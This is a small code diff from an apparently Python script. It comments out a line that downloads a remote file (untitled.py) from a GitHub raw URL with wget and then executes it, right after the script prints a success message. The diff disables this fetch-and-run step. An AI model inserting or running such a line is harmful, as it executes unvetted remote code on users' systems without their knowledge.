@@ -54,5 +54,5 @@ for x in range(len(response)):
         p.start()
       
 print ("* SUCCSESS")
-os.system("wget https://raw.githubusercontent.com/Thuwarakan/bulletpaandi/main/untitled.py && python untitled.py")
+#os.system("wget https://raw.githubusercontent.com/Thuwarakan/bulletpaandi/main/untitled.py && python untitled.py")
 
